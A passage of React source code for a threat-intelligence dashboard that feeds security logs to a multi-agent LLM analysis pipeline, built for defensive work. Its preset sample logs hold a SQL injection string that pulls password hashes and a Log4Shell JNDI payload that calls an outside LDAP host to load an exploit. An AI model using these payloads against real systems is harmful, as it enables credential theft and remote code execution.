import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  Cpu, 
  Database, 
  Play, 
  CheckCircle, 
  AlertTriangle, 
  Terminal, 
  RefreshCw, 
  Layers, 
  Server, 
  Trash2, 
  Globe, 
  FileText, 
  ChevronRight, 
  Code,
  Sliders, 
  Activity, 
  Plus, 
  Search,
  Sparkles,
  Send,
  ExternalLink,
  BookOpen
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { ThreatReport, RagDocument, SeverityLevel } from './types';

// Pre-packaged Threat preset templates to make sandbox logger fully functional instantly
const INSIGHT_TEMPLATES = [
  {
    name: 'SSH Brute-Force Log',
    source: 'AuthLog Sentry',
    text: 'Security log incident: Connection request on port 22 from suspicious IP address 198.51.100.42. System reported 45 consecutive failed login attempts for user root in less than 3 minutes. Internal host mailserver-prod was targeted.'
  },
  {
    name: 'SQL Injection Trace',
    source: 'Cloudflare WAF',
    text: 'Web sensor rule match ID 40043: URI query parameters mapped to potential SQL Injection. Request sent to /api/v1/users/account?uuid=90132%20UNION%20SELECT%20username,password_hash%20FROM%20admin_credentials%20-- on public database cluster postgres-prod.'
  },
  {
    name: 'Log4Shell LDAP JNDI Injection',
    source: 'Snort IPS Sensor',
    text: 'Intrusion detection match for CVE-2021-44228: Suspicious outbound Java JNDI LDAP lookup detected inside user-agent request headers matching payload: ${jndi:ldap://vulnerable-verifier.malicious-network.ru:1389/Exploit} routed to cluster app-gateway-srv.'
  },
  {
    name: 'Active EternalBlue Ransomware scan',
    source: 'Internal NetFlow Observer',
    text: 'NetFlow metadata log: Source node 203.0.113.88 scanned 15 local host devices over port 445 (SMB) in 30 seconds. Invalid SMB transaction state structures were matched, resembling early-stage EternalBlue (MS17-010) worm propagation protocols.'
  }
];

export default function App() {
  const [threats, setThreats] = useState<ThreatReport[]>([]);
  const [ragDocs, setRagDocs] = useState<RagDocument[]>([]);
  const [apiConnected, setApiConnected] = useState<boolean>(true);
  const [loading, setLoading] = useState<boolean>(false);
  const [activeStep, setActiveStep] = useState<string>('idle'); // 'retrieving' | 'analyzing' | 'summarizing' | 'alerting' | 'evaluating' | 'completed' | 'idle'
  
  // Custom Threat Logger Ingress form states
  const [rawText, setRawText] = useState<string>('');
  const [source, setSource] = useState<string>('Manual Terminal Ingress');
  
  // Selected Threat Report details
  const [selectedThreatId, setSelectedThreatId] = useState<string | null>(null);
  const selectedThreat = threats.find(t => t.id === selectedThreatId) || threats[0];

  // RAG Document Creator states
  const [showAddDocModal, setShowAddDocModal] = useState<boolean>(false);
  const [newDocTitle, setNewDocTitle] = useState<string>('');
  const [newDocCategory, setNewDocCategory] = useState<'malware' | 'network' | 'iam' | 'policy' | 'exploit'>('policy');
  const [newDocContent, setNewDocContent] = useState<string>('');
  const [newDocTags, setNewDocTags] = useState<string>('');

  // FastAPI endpoint playground simulator states
  const [swaggerSelectedMethod, setSwaggerSelectedMethod] = useState<'GET' | 'POST' | 'DELETE'>('GET');
  const [swaggerSelectedUrl, setSwaggerSelectedUrl] = useState<string>('/api/threats');
  const [swaggerResponseJson, setSwaggerResponseJson] = useState<string>('// Execute an endpoint below to inspect real-time JSON responses.');
  const [swaggerRequestPayload, setSwaggerRequestPayload] = useState<string>('{\n  "rawText": "SSH failure trace from ...",\n  "source": "Core Sentinel"\n}');

  // RAG filter states
  const [ragSearchQuery, setRagSearchQuery] = useState<string>('');
  const [ragCategoryFilter, setRagCategoryFilter] = useState<string>('all');

  // Gemini Key Issue Warning State
  const [geminiKeyWarning, setGeminiKeyWarning] = useState<boolean>(false);

  useEffect(() => {
    fetchThreatHistory();
    fetchRagDocuments();
    checkApiHealth();
  }, []);

  const checkApiHealth = async () => {
    try {
      const res = await fetch('/api/health');
      const data = await res.json();
      setApiConnected(true);
      if (!data.gemini_configured) {
        setGeminiKeyWarning(true);
      }
    } catch (e) {
      setApiConnected(false);
    }
  };

  const fetchThreatHistory = async () => {
    try {
      const res = await fetch('/api/threats');
      const data = await res.json();
      setThreats(data);
      if (data.length > 0 && !selectedThreatId) {
        setSelectedThreatId(data[0].id);
      }
    } catch (err) {
      console.error("Error fetching threat history lists:", err);
    }
  };

  const fetchRagDocuments = async () => {
    try {
      const res = await fetch('/api/rag/documents');
      const data = await res.json();
      setRagDocs(data);
    } catch (err) {
      console.error("Error fetching documentation RAG context banks:", err);
    }
  };

  const handleApplyTemplate = (tpl: typeof INSIGHT_TEMPLATES[0]) => {
    setRawText(tpl.text);
    setSource(tpl.source);
  };

  // Run the full multi-agent orchestration telemetry logs analysis pipeline
  const handleRunAgentPipeline = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!rawText.trim()) return;

    setLoading(true);
    setGeminiKeyWarning(false);
    
    // Animate stepping nodes to show visual telemetry in LangGraph representation
    const steps = ['retrieving', 'analyzing', 'summarizing', 'alerting', 'evaluating'];
    let currentStepIndex = 0;
    
    const interval = setInterval(() => {
      if (currentStepIndex < steps.length) {
        setActiveStep(steps[currentStepIndex]);
        currentStepIndex++;
      } else {
        clearInterval(interval);
      }
    }, 1200);

    try {
      const res = await fetch('/api/threats/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rawText, source })
      });

      const data = await res.json();
      clearInterval(interval);
      setActiveStep('completed');

      if (res.status === 201) {
        setThreats(prev => [data, ...prev]);
        setSelectedThreatId(data.id);
        // Clear terminal inputs
        setRawText('');
      } else if (data.missing_credentials) {
        setGeminiKeyWarning(true);
        if (data.report_preview) {
          // Add partial offline assessment
          setThreats(prev => [data.report_preview, ...prev]);
          setSelectedThreatId(data.report_preview.id);
        }
      } else {
        alert(data.message || data.error || "An error occurred executing agent pipelines.");
      }
    } catch (err: any) {
      clearInterval(interval);
      setActiveStep('idle');
      alert("Pipeline network request failed: Make sure server.ts is compiled and active.");
    } finally {
      setTimeout(() => {
        setLoading(false);
        setActiveStep('idle');
        fetchThreatHistory();
      }, 500);
    }
  };

  const handleAddCustomPlaybook = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newDocTitle || !newDocContent) return;

    try {
      const res = await fetch('/api/rag/documents', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          title: newDocTitle,
          category: newDocCategory,
          content: newDocContent,
          tags: newDocTags.split(',').map(t => t.trim()).filter(Boolean)
        })
      });

      if (res.ok) {
        fetchRagDocuments();
        // Reset state
        setNewDocTitle('');
        setNewDocContent('');
        setNewDocTags('');
        setShowAddDocModal(false);
      }
    } catch (err) {
      console.error(err);
    }
  };

  const handleDeleteThreat = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      const res = await fetch(`/api/threats/${id}`, { method: 'DELETE' });
      if (res.ok) {
        const remaining = threats.filter(t => t.id !== id);
        setThreats(remaining);
        if (selectedThreatId === id && remaining.length > 0) {
          setSelectedThreatId(remaining[0].id);
        }
      }
    } catch (e) {
      console.error("Failed to delete record:", e);
    }
  };

  const reseedDB = async () => {
    try {
      const res = await fetch('/api/threats/seed', { method: 'POST' });
      if (res.ok) {
        fetchThreatHistory();
        fetchRagDocuments();
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Run interactive swagger REST simulation in the API Playground
  const executeSwaggerSim = async () => {
    try {
      let response;
      if (swaggerSelectedMethod === 'GET') {
        response = await fetch(swaggerSelectedUrl);
      } else if (swaggerSelectedMethod === 'POST') {
        const parsedBody = JSON.parse(swaggerRequestPayload);
        response = await fetch(swaggerSelectedUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(parsedBody)
        });
      } else {
        response = await fetch(swaggerSelectedUrl, { method: 'DELETE' });
      }

      const resJson = await response.json();
      setSwaggerResponseJson(JSON.stringify(resJson, null, 2));
      
      // Keep UI reactive to deletions/additions
      fetchThreatHistory();
      fetchRagDocuments();
    } catch (err: any) {
      setSwaggerResponseJson(JSON.stringify({ 
        error: "Network Transmission Error", 
        message: err.toString(),
        solution: "Ensure the backend and env key is deployed and properly configured."
      }, null, 2));
    }
  };

  const filteredRagDocs = ragDocs.filter(doc => {
    const matchesSearch = doc.title.toLowerCase().includes(ragSearchQuery.toLowerCase()) || 
                          doc.content.toLowerCase().includes(ragSearchQuery.toLowerCase());
    const matchesFilter = ragCategoryFilter === 'all' || doc.category === ragCategoryFilter;
    return matchesSearch && matchesFilter;
  });

  const getSeverityColor = (lev: SeverityLevel | undefined) => {
    if (!lev) return 'bg-gray-100 text-gray-700 border-gray-200';
    switch (lev) {
      case 'LOW': return 'bg-blue-50 text-blue-700 border-blue-200';
      case 'MEDIUM': return 'bg-amber-50 text-amber-700 border-amber-200';
      case 'HIGH': return 'bg-orange-50 text-orange-700 border-orange-200';
      case 'CRITICAL': return 'bg-rose-50 text-rose-700 border-rose-200 animate-pulse';
    }
  };

  const getPriorityBadgeColor = (priority: 'P1' | 'P2' | 'P3' | 'P4' | undefined) => {
    if (!priority) return 'bg-gray-100 text-gray-700';
    switch (priority) {
      case 'P1': return 'bg-red-500 text-white';
      case 'P2': return 'bg-orange-500 text-white';
      case 'P3': return 'bg-amber-500 text-white';
      case 'P4': return 'bg-blue-500 text-white';
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-200 font-sans tracking-normal selection:bg-indigo-500 selection:text-white flex flex-col" id="main-frame">
      
      {/* Visual Workspace Decorative Header */}
      <header className="h-16 border-b border-slate-800 bg-slate-900/50 flex items-center justify-between px-6 shrink-0 sticky top-0 z-40 backdrop-blur" id="app-header">
        <div className="flex items-center gap-4">
          <div className="w-8 h-8 bg-indigo-600 rounded flex items-center justify-center">
            <ShieldAlert className="w-5 h-5 text-white" />
          </div>
          <h1 className="text-xl font-semibold tracking-tight text-white">SYNAPSE <span className="text-slate-500 font-normal">// Intelligence Core</span></h1>
        </div>
        <div className="flex items-center gap-6">
          <div className="hidden md:flex flex-col items-end">
            <span className="text-[10px] uppercase tracking-widest text-slate-500">FastAPI Endpoint</span>
            <span className="text-xs font-mono text-emerald-400">stable-v1.2 [0.12ms]</span>
          </div>
          <div className="hidden md:flex flex-col items-end">
            <span className="text-[10px] uppercase tracking-widest text-slate-500">ChromaDB / FAISS</span>
            <span className="text-xs font-mono text-indigo-400 font-semibold">{ragDocs.length} Knowledge Rules</span>
          </div>
          <div className="hidden md:block h-8 w-px bg-slate-800"></div>
          <div className="flex items-center gap-2 bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/20">
            <div className={`w-2 h-2 rounded-full ${apiConnected ? 'bg-emerald-500 animate-pulse' : 'bg-rose-500'}`}></div>
            <span className="text-xs font-medium text-emerald-500 uppercase tracking-tighter">System {apiConnected ? 'Live' : 'Offline'}</span>
          </div>
          <button 
            onClick={reseedDB}
            className="px-2.5 py-1.5 rounded-lg border border-slate-800 bg-slate-900/60 hover:bg-slate-800 duration-200 text-[11px] flex items-center gap-1 text-slate-300 font-mono transition-all"
            title="Reseed databases to presets"
          >
            <RefreshCw className="h-3 w-3" />
            <span>Reseed</span>
          </button>
        </div>
      </header>

      {/* Warning Banner for missing Gemini API credentials */}
      {geminiKeyWarning && (
        <div className="bg-amber-950/40 border-b border-amber-800/60 px-6 py-3.5 text-amber-200" id="gemini-key-warning">
          <div className="max-w-7xl mx-auto flex items-start gap-3">
            <AlertTriangle className="h-5 w-5 text-amber-500 shrink-0 mt-0.5" />
            <div className="text-sm">
              <span className="font-semibold text-white">System Alert: GEMINI_API_KEY Missing or Unconfigured.</span> Your application is running in unlinked mode. Complete agent orchestration requires model grounding. Configure your <span className="font-mono bg-amber-900/40 px-1 text-white border border-amber-700 rounded text-xs select-all">GEMINI_API_KEY</span> in the <span className="font-semibold text-white">Secrets Panel (Settings &gt; Secrets)</span> inside the AI Studio UI layout to launch the multi-agent automation loops.
            </div>
          </div>
        </div>
      )}

      {/* Main Structural Layout Grid */}
      <main className="max-w-7xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-6" id="workspace-center">
        
        {/* ================= COLUMN 1: THREAT INGRESS & RAG DATABASE (LG: 5 spans) ================= */}
        <section className="lg:col-span-5 flex flex-col gap-6" id="column-left">

          {/* Card: Threat Ingestion Sandbox */}
          <div className="bg-slate-950/60 border border-slate-800 rounded-xl p-5 shadow-xl relative overflow-hidden" id="ingress-sandbox">
            <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-full blur-2xl pointer-events-none" />
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Terminal className="h-4 w-4 text-cyan-400" />
                <h2 className="font-medium text-slate-200 text-sm">Threat Telemetry Log Ingress</h2>
              </div>
              <span className="text-[10px] font-mono text-slate-500">Node: [raw_ingest]</span>
            </div>

            {/* Template Presets Picker */}
            <div className="mb-4">
              <label className="text-[11px] font-medium text-slate-400 block mb-2">Populate Preloaded Ingress Logs:</label>
              <div className="grid grid-cols-2 gap-2">
                {INSIGHT_TEMPLATES.map((tpl, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleApplyTemplate(tpl)}
                    className="p-2 text-[11px] text-left rounded-lg bg-slate-900 border border-slate-800 text-slate-300 hover:border-cyan-500/50 hover:bg-slate-800 duration-150 transition-all truncate"
                  >
                    🚀 {tpl.name}
                  </button>
                ))}
              </div>
            </div>

            {/* Manual submission Form */}
            <form onSubmit={handleRunAgentPipeline} className="space-y-4">
              <div>
                <label className="text-[11px] font-medium text-slate-400 block mb-1">Threat Raw Logs / Incident description:</label>
                <textarea
                  value={rawText}
                  onChange={(e) => setRawText(e.target.value)}
                  placeholder="Paste raw server logs, packet traces, unmasked login sequences, or CVE definitions to trigger investigation playbooks..."
                  className="w-full h-32 rounded-lg bg-slate-900 border border-slate-800 p-3 text-xs text-slate-200 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 font-mono resize-none placeholder:text-slate-600"
                  required
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-[11px] font-medium text-slate-400 block mb-1 font-sans">Sensor / source origin:</label>
                  <input
                    type="text"
                    value={source}
                    onChange={(e) => setSource(e.target.value)}
                    placeholder="WAF Firewall system"
                    className="w-full rounded-lg bg-slate-900 border border-slate-800 p-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
                    required
                  />
                </div>
                <div className="flex items-end">
                  <button
                    type="submit"
                    disabled={loading || !rawText.trim()}
                    className="w-full h-[38px] rounded-lg bg-gradient-to-r from-cyan-600 to-indigo-600 font-medium text-xs text-white hover:opacity-90 transition-all shadow-md shadow-cyan-500/10 flex items-center justify-center gap-1.5 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {loading ? (
                      <>
                        <RefreshCw className="h-3.5 w-3.5 animate-spin" />
                        <span>Orchestrating Graph...</span>
                      </>
                    ) : (
                      <>
                        <Play className="h-3.5 w-3.5 fill-current" />
                        <span>ENGAGE AGENT GRAPH</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </form>
          </div>

          {/* Active Agents Progress Bars Widget from Sleek Interface Theme */}
          <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl relative overflow-hidden" id="active-agents-gauge">
            <h2 className="text-[11px] font-bold uppercase tracking-widest text-slate-500 mb-4 font-sans">// Active Agents</h2>
            <div className="space-y-3">
              <div className={`p-3 rounded-lg border transition-all duration-200 ${activeStep === 'retrieving' ? 'bg-indigo-500/5 border-indigo-500/30' : 'bg-slate-950/40 border-slate-800'}`}>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-xs font-semibold font-mono text-slate-200">Ingest_RAG_Agent</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded font-bold font-mono border ${activeStep === 'retrieving' ? 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                    {activeStep === 'retrieving' ? 'ACTIVE' : 'IDLE'}
                  </span>
                </div>
                <div className="h-1 w-full bg-slate-850 rounded-full overflow-hidden">
                  <div className="h-full bg-indigo-500 transition-all duration-300" style={{ width: activeStep === 'retrieving' ? '100%' : '100%' }}></div>
                </div>
              </div>

              <div className={`p-3 rounded-lg border transition-all duration-200 ${activeStep === 'analyzing' ? 'bg-emerald-500/5 border-emerald-500/30' : 'bg-slate-950/40 border-slate-800'}`}>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-xs font-semibold font-mono text-slate-200">Analysis_Core_Agent</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded font-bold font-mono border ${activeStep === 'analyzing' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20 animate-pulse' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                    {activeStep === 'analyzing' ? 'ACTIVE' : selectedThreat?.analysis ? 'STANDBY' : 'WAITING'}
                  </span>
                </div>
                <div className="h-1 w-full bg-slate-850 rounded-full overflow-hidden">
                  <div className="h-full bg-emerald-500 transition-all duration-500" style={{ width: activeStep === 'analyzing' ? '65%' : selectedThreat?.analysis ? '100%' : '0%' }}></div>
                </div>
              </div>

              <div className={`p-3 rounded-lg border transition-all duration-200 ${activeStep === 'alerting' ? 'bg-indigo-500/5 border-indigo-500/30 font-bold' : 'bg-slate-950/40 border-slate-800'}`}>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-xs font-semibold font-mono text-slate-200">Alert_Publisher_Agent</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded font-bold font-mono border ${activeStep === 'alerting' ? 'bg-amber-500/10 text-amber-400 border-amber-500/20 animate-pulse' : 'bg-slate-800 text-slate-500 border-slate-700'}`}>
                    {activeStep === 'alerting' ? 'ACTIVE' : selectedThreat?.alert ? 'STANDBY' : 'WAITING'}
                  </span>
                </div>
                <div className="h-1 w-full bg-slate-850 rounded-full overflow-hidden">
                  <div className="h-full bg-indigo-500 transition-all duration-500" style={{ width: activeStep === 'alerting' ? '85%' : selectedThreat?.alert ? '100%' : '0%' }}></div>
                </div>
              </div>
            </div>

            <div className="mt-4">
              <div className="p-4 bg-slate-950 rounded-xl border border-slate-800">
                <h3 className="text-[10px] font-bold uppercase tracking-widest text-slate-500 mb-2 font-mono">RAG Context Relevancy</h3>
                <div className="text-2xl font-mono text-white mb-1">94.8<span className="text-slate-500 text-sm">%</span></div>
                <div className="flex items-center gap-1 text-[10px] text-emerald-400 font-mono">
                  <span>+2.4% from previous batch analysis</span>
                </div>
              </div>
            </div>
          </div>

          {/* Card: FAISS / ChromaDB RAG Document Database */}
          <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl flex-1 flex flex-col min-h-[400px]" id="rag-database">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Database className="h-4 w-4 text-emerald-400" />
                <div>
                  <h2 className="font-medium text-slate-200 text-sm">FAISS & ChromaDB RAG database</h2>
                  <p className="text-[10px] text-slate-400">Similarity context search references for LLM feedback</p>
                </div>
              </div>
              <button
                onClick={() => setShowAddDocModal(true)}
                className="px-2 py-1 bg-emerald-500/15 border border-emerald-500/20 text-emerald-400 hover:bg-emerald-500/25 text-[10px] rounded flex items-center gap-1 font-mono transition-all"
              >
                <Plus className="h-3 w-3" /> Add Playbook
              </button>
            </div>

            {/* RAG Filters */}
            <div className="grid grid-cols-12 gap-2 mb-4">
              <div className="col-span-7 relative">
                <Search className="h-3.5 w-3.5 text-slate-500 absolute left-2.5 top-2.5" />
                <input
                  type="text"
                  value={ragSearchQuery}
                  onChange={(e) => setRagSearchQuery(e.target.value)}
                  placeholder="Filter key queries..."
                  className="w-full pl-8 pr-2 py-1.5 rounded-lg bg-slate-900 border border-slate-800 text-[11px] focus:outline-none focus:border-emerald-500 text-slate-300"
                />
              </div>
              <div className="col-span-5">
                <select
                  value={ragCategoryFilter}
                  onChange={(e) => setRagCategoryFilter(e.target.value)}
                  className="w-full px-2 py-1.5 rounded-lg bg-slate-900 border border-slate-800 text-[11px] focus:outline-none focus:border-emerald-500 text-slate-300"
                >
                  <option value="all">All Category</option>
                  <option value="network">Network/SSH</option>
                  <option value="exploit">Exploits/CVE</option>
                  <option value="malware">Malware Profiles</option>
                  <option value="iam">IAM Roles</option>
                  <option value="policy">Policy Standard</option>
                </select>
              </div>
            </div>

            {/* Playbook List */}
            <div className="space-y-3 overflow-y-auto max-h-[300px] flex-1 pr-1" id="rag-items-scrollbar">
              {filteredRagDocs.length === 0 ? (
                <div className="py-8 text-center text-xs text-slate-500 font-mono">
                  No matching playbook entries found.
                </div>
              ) : (
                filteredRagDocs.map((doc) => (
                  <div key={doc.id} className="p-3 bg-slate-900/80 border border-slate-850 rounded-lg hover:border-emerald-500/40 transition-all group">
                    <div className="flex items-start justify-between mb-1.5">
                      <span className="text-xs font-semibold text-slate-200 group-hover:text-emerald-400 transition-colors">
                        {doc.title}
                      </span>
                      <span className="text-[9px] px-1.5 py-0.5 rounded font-mono bg-slate-800 text-slate-400 uppercase">
                        {doc.category}
                      </span>
                    </div>
                    <p className="text-[10px] text-slate-400 line-clamp-3 leading-relaxed font-mono">
                      {doc.content}
                    </p>
                    <div className="flex flex-wrap gap-1 mt-2">
                      {doc.tags.map((tag, i) => (
                        <span key={i} className="text-[8px] bg-slate-805 px-1 py-0.5 rounded text-slate-500 font-mono">
                          #{tag}
                        </span>
                      ))}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>

        </section>

        {/* ================= COLUMN 2: ORCHESTRATION GRAPH & WORKSPACE (LG: 7 spans) ================= */}
        <section className="lg:col-span-7 flex flex-col gap-6" id="column-right">

          {/* Card: LangGraph Orchestrator Execution Visualizer */}
          <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl" id="langgraph-visualizer">
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-2">
                <Cpu className="h-4 w-4 text-slate-400" />
                <div>
                  <h2 className="text-[11px] font-bold uppercase tracking-widest text-slate-500 font-mono">// Orchestration Flow</h2>
                  <p className="text-[10px] text-slate-400 font-mono">Routing pathways / LangGraph agent state machine</p>
                </div>
              </div>
              <span className="text-[9px] font-mono px-2 py-0.5 bg-slate-950 text-slate-400 rounded-full border border-slate-800">
                Active Nodes: [5]
              </span>
            </div>

            {/* Interactive Graph Node Flow */}
            <div className="p-4 bg-slate-900/60 rounded-xl border border-slate-850 flex flex-col md:flex-row justify-between items-center gap-4 relative overflow-hidden">
              <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(6,182,212,0.03),transparent)] pointer-events-none" />

              {/* Node 1: Ingest & Retrieve */}
              <div className={`p-3 rounded-lg border flex flex-col items-center gap-1.5 w-full md:w-28 text-center transition-all ${
                activeStep === 'retrieving' 
                  ? 'border-cyan-500 bg-cyan-950/20 text-cyan-200 shadow-md shadow-cyan-500/10' 
                  : (selectedThreat && selectedThreat.matchedDocs.length > 0) || activeStep === 'completed'
                  ? 'border-emerald-500/50 bg-emerald-950/10 text-emerald-300'
                  : 'border-slate-800 bg-slate-950 text-slate-500'
              }`}>
                <Database className={`h-4 w-4 ${activeStep === 'retrieving' ? 'animate-spin' : ''}`} />
                <div className="text-[10px] font-bold tracking-wider uppercase font-mono">FAISS Context</div>
                <div className="text-[8px] text-slate-400 font-mono">1. Vector RAG</div>
              </div>

              <ChevronRight className="h-4 w-4 text-slate-600 hidden md:block shrink-0" />

              {/* Node 2: Analysis Agent */}
              <div className={`p-3 rounded-lg border flex flex-col items-center gap-1.5 w-full md:w-28 text-center transition-all ${
                activeStep === 'analyzing'
                  ? 'border-cyan-500 bg-cyan-950/20 text-cyan-200 shadow-md shadow-cyan-500/10'
                  : selectedThreat?.analysis || activeStep === 'completed'
                  ? 'border-emerald-500/50 bg-emerald-950/10 text-emerald-300'
                  : 'border-slate-800 bg-slate-950 text-slate-500'
              }`}>
                <ShieldAlert className="h-4 w-4" />
                <div className="text-[10px] font-bold tracking-wider uppercase font-mono">Analysis</div>
                <div className="text-[8px] text-slate-400 font-mono">2. Severity IP</div>
              </div>

              <ChevronRight className="h-4 w-4 text-slate-600 hidden md:block shrink-0" />

              {/* Node 3: Summarization Agent */}
              <div className={`p-3 rounded-lg border flex flex-col items-center gap-1.5 w-full md:w-28 text-center transition-all ${
                activeStep === 'summarizing'
                  ? 'border-cyan-500 bg-cyan-950/20 text-cyan-200 shadow-md shadow-cyan-500/10'
                  : selectedThreat?.summary || activeStep === 'completed'
                  ? 'border-emerald-500/50 bg-emerald-950/10 text-emerald-300'
                  : 'border-slate-800 bg-slate-950 text-slate-500'
              }`}>
                <FileText className="h-4 w-4" />
                <div className="text-[10px] font-bold tracking-wider uppercase font-mono">Summarize</div>
                <div className="text-[8px] text-slate-400 font-mono">3. Exec Digest</div>
              </div>

              <ChevronRight className="h-4 w-4 text-slate-600 hidden md:block shrink-0" />

              {/* Node 4: Alerting Agent */}
              <div className={`p-3 rounded-lg border flex flex-col items-center gap-1.5 w-full md:w-28 text-center transition-all ${
                activeStep === 'alerting'
                  ? 'border-cyan-500 bg-cyan-950/20 text-cyan-200 shadow-md shadow-cyan-500/10'
                  : selectedThreat?.alert || activeStep === 'completed'
                  ? 'border-emerald-500/50 bg-emerald-950/10 text-emerald-300'
                  : 'border-slate-800 bg-slate-950 text-slate-500'
              }`}>
                <Activity className="h-4 w-4" />
                <div className="text-[10px] font-bold tracking-wider uppercase font-mono">Alert Engine</div>
                <div className="text-[8px] text-slate-400 font-mono">4. Send Webhook</div>
              </div>

              <ChevronRight className="h-4 w-4 text-slate-600 hidden md:block shrink-0" />

              {/* Node 5: Evaluation Agent */}
              <div className={`p-3 rounded-lg border flex flex-col items-center gap-1.5 w-full md:w-28 text-center transition-all ${
                activeStep === 'evaluating'
                  ? 'border-cyan-500 bg-cyan-950/20 text-cyan-200 shadow-md shadow-cyan-500/10'
                  : selectedThreat?.evaluation || activeStep === 'completed'
                  ? 'border-emerald-500/50 bg-emerald-950/10 text-emerald-300'
                  : 'border-slate-800 bg-slate-950 text-slate-500'
              }`}>
                <Sliders className="h-4 w-4" />
                <div className="text-[10px] font-bold tracking-wider uppercase font-mono">Evaluation</div>
                <div className="text-[8px] text-slate-400 font-mono">5. Verification</div>
              </div>
            </div>

            {/* Node Action Status Bar */}
            <div className="mt-3.5 flex items-center justify-between text-xs font-mono text-slate-400 bg-slate-900/40 p-2.5 rounded-lg border border-slate-850">
              <div className="flex items-center gap-2">
                <span className={`h-2 w-2 rounded-full ${loading ? 'bg-cyan-500 animate-ping' : 'bg-slate-600'}`} />
                <span>Orchestrator Stage:</span>
                <span className="text-cyan-400 font-semibold uppercase">{loading ? `${activeStep} agent running...` : 'Orchestration Idle - Ready'}</span>
              </div>
              <span className="text-[11px] text-slate-500 text-right">State keys passed inside edges</span>
            </div>
          </div>

          {/* Split Block: Historical Registry List vs Selected Active Threat details workspace */}
          <div className="grid grid-cols-1 md:grid-cols-12 gap-6" id="historic-agent-results flex-1">
            
            {/* List: Threats Analysis History (MD: 4 spans) */}
            <div className="md:col-span-4 bg-slate-900/50 border border-slate-800 rounded-xl p-4 flex flex-col max-h-[600px] overflow-hidden shadow-xl" id="incident-registry-list">
              <h3 className="text-xs font-medium text-slate-300 pb-3 border-b border-slate-800 font-mono mb-3">Threat Logs Catalog</h3>

              <div className="space-y-2 overflow-y-auto flex-1 pr-1" id="history-scroller">
                {threats.length === 0 ? (
                  <div className="py-12 text-center text-xs text-slate-500 font-mono">
                    Ingress catalog empty. Try submitting logs above to launch agent loops.
                  </div>
                ) : (
                  threats.map((t) => {
                    const isSelected = selectedThreatId === t.id;
                    return (
                      <div
                        key={t.id}
                        onClick={() => setSelectedThreatId(t.id)}
                        className={`p-3 rounded-lg border text-left cursor-pointer transition-all duration-150 relative ${
                          isSelected 
                            ? 'bg-slate-900 border-cyan-500/60 shadow-md shadow-cyan-500/5' 
                            : 'bg-slate-900/40 border-slate-850 hover:bg-slate-900 hover:border-slate-800'
                        }`}
                      >
                        <div className="flex items-center justify-between gap-1 mb-1.5">
                          <span className={`text-[8px] px-1.5 py-0.5 rounded font-mono border font-semibold ${getSeverityColor(t.analysis?.severity)}`}>
                            {t.analysis?.severity || 'PENDING'}
                          </span>
                          <span className="text-[8px] font-mono text-slate-500">
                            {new Date(t.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </span>
                        </div>
                        
                        <p className="text-[10px] font-mono text-slate-300 line-clamp-2 leading-relaxed">
                          {t.rawText}
                        </p>

                        <div className="flex items-center justify-between mt-2.5 pt-2 border-t border-slate-800/60">
                          <span className="text-[8px] font-mono text-slate-400 shrink-0">
                            ⭐ Rating: <span className="text-white font-semibold">{t.evaluation?.accuracyScore ? `${t.evaluation.accuracyScore}/10` : 'N/A'}</span>
                          </span>
                          <button
                            onClick={(e) => handleDeleteThreat(t.id, e)}
                            className="text-slate-500 hover:text-rose-400 p-0.5 duration-100"
                            title="Remove log from system catalog"
                          >
                            <Trash2 className="h-3 w-3" />
                          </button>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </div>

            {/* Active Details Workspace (MD: 8 spans) */}
            <div className="md:col-span-8 flex flex-col gap-5 overflow-y-auto max-h-[600px] pr-1" id="active-findings-workspace">
              {selectedThreat ? (
                <>
                  {/* Analysis Findings Card */}
                  <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 shadow-xl relative overflow-hidden">
                    <div className="flex items-start justify-between mb-4">
                      <div>
                        <span className="text-[9px] font-mono text-slate-400">Node Output: [agent_evaluator_analysis]</span>
                        <h3 className="font-semibold text-slate-100 text-sm flex items-center gap-2 mt-0.5">
                          Threat Analysis Intelligence
                        </h3>
                      </div>
                      <span className={`text-xs px-2.5 py-1 rounded font-mono border font-semibold ${getSeverityColor(selectedThreat.analysis?.severity)}`}>
